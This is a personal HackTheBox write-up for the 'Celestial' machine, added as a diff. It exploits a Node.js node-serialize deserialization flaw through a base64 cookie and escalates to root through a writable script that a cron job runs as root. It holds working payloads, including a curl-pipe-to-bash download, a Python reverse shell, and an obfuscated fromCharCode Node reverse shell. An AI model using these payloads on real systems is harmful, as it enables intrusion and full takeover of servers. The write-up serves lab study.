@@ -1,0 +1,463 @@
+Celestial - HTB - Linux - NodeJS, Node Serialization
+
+NodeJS running on port 3000, addvertising itself as an http web service, NODESJS express fraework.
+Webserver built around javascript. One programming language for both front end and backend code. Crappy code as one.
+
+We get a 404 error when hit the web page.
+
+Lets run gobuster.
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/celestial]
+└──╼ $gobuster dir -u http://10.10.10.85:3000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.log
+==================================================================================================================================
+
+Now we can use burp to play around with the webpage.
+Analyzing the request we are immediately assigned a cookie, which is base64 encoded
+
+On our initial web request and response we get the following string:
+Hey Dummy 2 + 2 is 22
+
+Commands and Output:
+==================================================================================================================================
+Cookie: profile=eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ%3D%3D
+==================================================================================================================================
+
+We use the decode feature on burp and use smart decode to url decode it and the base64 decode the string.
+We get the following object
+Commands and Output:
+================================================================================================================================
+eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ==
+
+{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}
+================================================================================================================================
+
+We can edit the num field and see what we get, when reupload the php cookie request. And the results after editing the 
+num field to 100 are:
+Hey Dummy 100 + 100 is 100100
+
+Looks like the num field is being concatenated.
+
+The web server is utilizing the cookie somehow and is going through some serialized object.
+We look for nodejs serialzized vulnerability.
+https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
+
+Purpose of serialization is to take any piece of code and convert it to  a byte stream and be able to load it elsewhere.
+With node we are going to serialize a function, looking through node serialized it just evals function and with eval we can just 
+execute code.
+
+Commands and Output:
+==================================================================================================================================
+sudo apt install npm
+npm install node-serialize
+==================================================================================================================================
+
+After installing node we grab the example payload code and see the output of the js script.
+Commands and Output:
+==================================================================================================================================
+var y = {
+ rce : function(){
+ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
+ },
+}
+var serialize = require('node-serialize');
+console.log("Serialized: \n" + serialize.serialize(y));
+
+..
+..
+..
+
+Serialized: 
+{"rce":"_$$ND_FUNC$$_function(){\n require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });\n }"}
+
+==================================================================================================================================
+
+It outputs the serialized object. We want to go into npm node modules.
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/celestial/exploit-dev/node_modules/node-serialize]
+└──╼ $grep -Ri ND_FUNC .
+./lib/serialize.js:var FUNCFLAG = '_$$ND_FUNC$$_';
+==================================================================================================================================
+
+We now look at the file ./lib/serialize.js
+
+We look at the variable the function string NF_FUNC was stored in and watch for what it goes through step by step.
+FUNCFLAG
+Commands and Output:
+==================================================================================================================================
+var FUNCFLAG = '_$$ND_FUNC$$_';
+var CIRCULARFLAG = '_$$ND_CC$$_';
+var KEYPATHSEPARATOR = '_$$.$$_';
+var ISNATIVEFUNC = /^function\s*[^(]*\(.*\)\s*\{\s*\[native code\]\s*\}$/;
+
+var getKeyPath = function(obj, path) {
+  path = path.split(KEYPATHSEPARATOR);
+  var currentObj = obj;
+  path.forEach(function(p, index) {
+    if (index) {
+      currentObj = currentObj[p];
+    }
+  });
+  return currentObj;
+};
+
+exports.serialize = function(obj, ignoreNativeFunc, outputObj, cache, path) {
+  path = path || '$';
+  cache = cache || {};
+  cache[path] = obj;
+  outputObj = outputObj || {};
+
+  var key;
+  for(key in obj) {
+    if(obj.hasOwnProperty(key)) {
+      if(typeof obj[key] === 'object' && obj[key] !== null) {
+        var subKey;
+        var found = false;
+        for(subKey in cache) {
+          if (cache.hasOwnProperty(subKey)) {
+            if (cache[subKey] === obj[key]) {
+              outputObj[key] = CIRCULARFLAG + subKey;
+              found = true;
+            }
+          }
+        }
+        if (!found) {
+          outputObj[key] = exports.serialize(obj[key], ignoreNativeFunc, outputObj[key], cache, path + KEYPATHSEPARATOR + key);
+        }
+      } else if(typeof obj[key] === 'function') {
+        var funcStr = obj[key].toString();
+        if(ISNATIVEFUNC.test(funcStr)) {
+          if(ignoreNativeFunc) {
+            funcStr = 'function() {throw new Error("Call a native function unserialized")}';
+          } else {
+            throw new Error('Can\'t serialize a object with a native function property. Use serialize(obj, true) to ignore the error.');
+          }
+        }
+        outputObj[key] = FUNCFLAG + funcStr;
+      } else {
+        outputObj[key] = obj[key];
+      }
+    }
+  }
+
+  return (path === '$') ? JSON.stringify(outputObj) : outputObj;
+};
+
+exports.unserialize = function(obj, originObj) {
+  var isIndex;
+  if (typeof obj === 'string') {
+    obj = JSON.parse(obj);
+    isIndex = true;
+  }
+  originObj = originObj || obj;
+
+  var circularTasks = [];
+  var key;
+  for(key in obj) {
+    if(obj.hasOwnProperty(key)) {
+      if(typeof obj[key] === 'object') {
+        obj[key] = exports.unserialize(obj[key], originObj);
+      } else if(typeof obj[key] === 'string') {
+        if(obj[key].indexOf(FUNCFLAG) === 0) {
+          obj[key] = eval('(' + obj[key].substring(FUNCFLAG.length) + ')');
+        } else if(obj[key].indexOf(CIRCULARFLAG) === 0) {
+          obj[key] = obj[key].substring(CIRCULARFLAG.length);
+          circularTasks.push({obj: obj, key: key});
+        }
+      }
+    }
+  }
+
+  if (isIndex) {
+    circularTasks.forEach(function(task) {
+      task.obj[task.key] = getKeyPath(originObj, task.obj[task.key]);
+    });
+  }
+  return obj;
+};
+==================================================================================================================================
+
+Based on the output we are able to see that funcflag was passed into eval which leads to code execution.
+
+Since we now now where our vulnerability lies we can go back to our payload and edit it.
+We know we get output with the username field so we can place our malcious payload in there.
+Commands and Output:
+==================================================================================================================================
+var y = 
+  {
+    "username": function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })},
+    "country":"Idk Probably Somewhere Dumb",
+    "city":"Lametown",
+    "num":"100"
+}
+var serialize = require('node-serialize');
+console.log("Serialized: \n" + serialize.serialize(y));
+
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+var y = 
+  {
+    "username": function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })},
+    "country":"Idk Probably Somewhere Dumb",
+    "city":"Lametown",
+    "num":"100"
+}
+var serialize = require('node-serialize');
+console.log("Serialized: \n" + serialize.serialize(y));
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/celestial/exploit-dev]
+└──╼ $node payload.js 
+Serialized: 
+{"username":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"100"}
+==================================================================================================================================
+
+We try re-encoding and using repeater on the page but still get errors running the function.
+Looks like we forgot "()" at the end of the username set.
+Our payload should now look like the following
+Commands and Output:
+==================================================================================================================================
+{"username":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}()","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"100"}
+==================================================================================================================================
+
+However after using the encoder and repeater we still get the following
+Commands and Output:
+==================================================================================================================================
+An error occurred...invalid username type
+==================================================================================================================================
+
+The application detected that we put a function where the username would go. So we have to go back and remove any references with
+func and try to rce.
+Commands and Output:
+==================================================================================================================================
+{"username":"_$$ND_FUNC$$_require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"100"}
+==================================================================================================================================
+
+And this time we get the following
+Commands and Output:
+==================================================================================================================================
+Hey [object Object] 100 + 100 is 100100
+==================================================================================================================================
+
+We get code execution it's just that the object is not being outputed correctly to further verify we can try pinging ourselves, to 
+prove it.
+Commands and Output:
+==================================================================================================================================
+{"username":"_$$ND_FUNC$$_require('child_process').exec('ping -c 1 10.10.14.18', function(error, stdout, stderr) { console.log(stdout) })","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"100"}
+
+..
+..
+..
+
+┌─[user@parrot-virtual]─[~/htb/celestial/exploit-dev]
+└──╼ $sudo tcpdump -i tun0 icmp
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+12:17:15.574083 IP 10.10.10.85 > 10.10.14.18: ICMP echo request, id 7980, seq 1, length 64
+12:17:15.574121 IP 10.10.14.18 > 10.10.10.85: ICMP echo reply, id 7980, seq 1, length 64
+
+==================================================================================================================================
+
+We can now try and get a reverse shell working. We try regular bash shells however those do not appear to be working, But instead we 
+will use curl and have bash execute whatever is in the downloaded into memory.
+Commands and Output:
+==================================================================================================================================
+{"username":"_$$ND_FUNC$$_require('child_process').exec('curl 10.10.14.18/shell.sh | bash  ', function(error, stdout, stderr) { console.log(stdout) })","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"100"}
+==================================================================================================================================
+
+We base64 enocde it, and bring up a webserver and run the command.
+Commands and Output:
+==================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/celestial/www]
+└──╼ $sudo python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.85 - - [19/May/2021 12:27:17] "GET /shell.sh HTTP/1.1" 200 -
+..
+..
+..
+
+┌─[user@parrot-virtual]─[~/htb/celestial/exploit-dev]
+└──╼ $nc -lnvp 9001
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::9001
+Ncat: Listening on 0.0.0.0:9001
+Ncat: Connection from 10.10.10.85.
+Ncat: Connection from 10.10.10.85:44566.
+bash: cannot set terminal process group (3697): Inappropriate ioctl for device
+bash: no job control in this shell
+sun@sun:~$ ls
+==================================================================================================================================
+
+Once in we make note of the fact that we are part of the adm group meaning we can look at log data in /var/log
+Commands and Output:
+==================================================================================================================================
+sun@sun:/var/log$ id
+uid=1000(sun) gid=1000(sun) groups=1000(sun),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
+==================================================================================================================================
+
+From there we can look anything root related by simply using the following grep command inside /var/log
+Commands and Output:
+==================================================================================================================================
+sun@sun:/var/log$ grep -Ri root . 2>/dev/null
+..
+..
+..
+
+./syslog:May 19 10:50:01 sun CRON[6889]: (root) CMD (python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py)
+./syslog:May 19 10:55:01 sun CRON[6907]: (root) CMD (python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py)
+..
+..
+..
+
+==================================================================================================================================
+
+
+We find some interesting data related to root. Specifcally a script that is being executed from our users home directory.
+And it looks like it is being ran every 5 minutes so we can edit the file and get a reverse shell. We get a python snippet of code
+to do this.
+Commands and Output:
+==================================================================================================================================
+cat /home/sun/Documents/script.py
+
+print "Script is running..."
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.10.14.18",9002))
+os.dup2(s.fileno(),0) 
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"])
+==================================================================================================================================
+
+And we just wait for the shell to execute.
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/celestial/www]
+└──╼ $nc -lnvp 9002
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::9002
+Ncat: Listening on 0.0.0.0:9002
+Ncat: Connection from 10.10.10.85.
+Ncat: Connection from 10.10.10.85:49446.
+/bin/sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)
+==================================================================================================================================
+
+EXTRA CONTENT: Getting Node Shell Working.
+
+We can encode our nodejs shell payload in order to be able to send it in our js shell. The following link contains code written
+in python on how to do that.
+https://raw.githubusercontent.com/carnal0wnage/exploits-1/master/nodejsshell.py
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/celestial/www]
+└──╼ $wget https://raw.githubusercontent.com/carnal0wnage/exploits-1/master/nodejsshell.py
+..
+..
+..
+┌─[user@parrot-virtual]─[~/htb/celestial/www]
+└──╼ $python2 nodejsshell.py 10.10.14.18 9002
+[+] LHOST = 10.10.14.18
+[+] LPORT = 9002
+[+] Encoding
+eval(String.fromCharCode(118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,44,117,116,105,108,32,61,32,114,101,113,117,105,114,101,40,39,117,116,105,108,39,41,44,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,44,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,72,79,83,84,61,34,49,48,46,49,48,46,49,52,46,49,56,34,59,80,79,82,84,61,34,57,48,48,50,34,59,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,34,41,59,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,32,32,32,32,32,32,32,32,117,116,105,108,46,112,117,109,112,40,115,104,46,115,116,100,111,117,116,44,99,108,105,101,110,116,41,59,32,32,32,32,125,41,59,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,32,32,32,32,125,41,59,125,32,99,40,72,79,83,84,44,80,79,82,84,41,59))
+==================================================================================================================================
+
+We get one line code of the character being encoded in, we can now paste this code into our original payload.js and see if we can 
+get a shell call back.
+
+The final modified payload will look somehting like this.
+Commands and Output:
+==================================================================================================================================
+  {
+    "username": "have_fun",
+    "country":"Idk Probably Somewhere Dumb",
+    "city":"Lametown",
+    "num":"100",
+    "rce":"_$$ND_FUNC$$_function() {eval(String.fromCharCode(118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,44,117,116,105,108,32,61,32,114,101,113,117,105,114,101,40,39,117,116,105,108,39,41,44,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,44,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,72,79,83,84,61,34,49,48,46,49,48,46,49,52,46,49,56,34,59,80,79,82,84,61,34,57,48,48,50,34,59,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,34,41,59,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,32,32,32,32,32,32,32,32,117,116,105,108,46,112,117,109,112,40,115,104,46,115,116,100,111,117,116,44,99,108,105,101,110,116,41,59,32,32,32,32,125,41,59,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,32,32,32,32,125,41,59,125,32,99,40,72,79,83,84,44,80,79,82,84,41,59))}()"
+}
+==================================================================================================================================
+
+We paste the following into Burp's decoder feature and encode as base64 and then as URL
+Commands and Output:
+==================================================================================================================================
+ICB7CiAgICAidXNlcm5hbWUiOiAiaGF2ZV9mdW4iLAogICAgImNvdW50cnkiOiJJZGsgUHJvYmFibHkgU29tZXdoZXJlIER1bWIiLAog .. .. .. c5LDgyLDg0L
+
+..
+..
+..
+%49%43%42%37%43%69%41%67%49%43%41%69%64%58%4e%6c%63%6d  .. .. .. ..  %43%6b%69%43%6e%30%
+==================================================================================================================================
+
+Now with that out of the way place the URL endoed payload into the cookie and send and wait to receive the reverse shell back.
+Commands and Output:
+==================================================================================================================================
+GET / HTTP/1.1
+Host: 10.10.10.85:3000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Cookie: profile=%49%43%42%37%43%69%41%67%49%43%41%69%64%58%4e%6c%63%6d%35%68%62%57%55%69%4f .. <SNIP> ..
+
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+If-None-Match: W/"c-8lfvj2TmiRRvB7K+JPws1w9h6aY"
+Cache-Control: max-age=0
+==================================================================================================================================
+
+And we get the reverse shell back
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/celestial/www]
+└──╼ $nc -lnvp 9002
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::9002
+Ncat: Listening on 0.0.0.0:9002
+Ncat: Connection from 10.10.10.85.
+Ncat: Connection from 10.10.10.85:49450.
+Connected
+ls
+Desktop
+Documents
+Downloads
+examples.desktop
+Music
+node_modules
+output.txt
+Pictures
+Public
+server.js
+Templates
+Videos
+whoami
+sun
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
